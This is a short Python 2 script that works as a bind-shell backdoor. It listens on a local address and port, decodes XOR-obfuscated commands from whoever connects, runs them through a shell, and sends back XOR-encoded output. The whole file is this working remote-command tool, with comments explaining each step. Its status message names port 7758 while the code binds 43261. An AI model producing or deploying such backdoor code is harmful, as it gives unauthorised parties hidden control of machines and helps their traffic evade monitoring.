import socket, subprocess, sys



while True:
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.bind(("192.168.1.100", 43261))
	s.listen(2048)
	print "Listening on port 7758... "
	(client, (ip, port)) = s.accept()
	print " recived connection from : ",ip
	# receive XOR encoded data from network socket
	data = client.recv(1024)
	# XOR the data again with a '\x41' to get back to normal data
	en_data = bytearray(data)
	for i in range(len(en_data)):
	    en_data[i] ^= 0x41
	# Execute the decode data as a command.
	# The subprocess module is great because we can PIPE STDOUT/STDERR/STDIN to a variable
	comm = subprocess.Popen(str(en_data), shell = True, stdout = subprocess.PIPE, stderr = subprocess.PIPE, stdin = subprocess.PIPE)
	comm.wait()
	STDOUT, STDERR = comm.communicate()   
	print STDERR
	# Encode the output and send to RHOST
	en_STDOUT= bytearray(STDOUT)
	for i in range(len(en_STDOUT)):
	    en_STDOUT[i] ^= 0x41
	client.send(en_STDOUT)
	client.close()